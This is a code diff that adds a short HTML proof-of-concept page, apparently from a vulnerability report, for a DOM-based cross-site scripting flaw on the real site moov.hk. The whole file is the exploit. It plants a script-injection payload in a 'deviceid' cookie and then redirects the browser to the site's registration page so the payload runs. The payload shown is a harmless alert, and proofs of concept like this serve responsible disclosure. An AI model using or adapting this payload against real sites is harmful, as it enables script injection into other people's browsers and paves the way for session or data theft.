@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>DOM XSS PoC - moov.hk</title>
+    <script>
+      // Injecting payload via deviceid cookie
+      document.cookie = 'deviceid="><script>alert(document.domain)</script>"; path=/';
+      
+      // Redirecting to vulnerable page
+      location.href = "https://moov.hk/reg/index.html";
+    </script>
+  </head>
+</html>
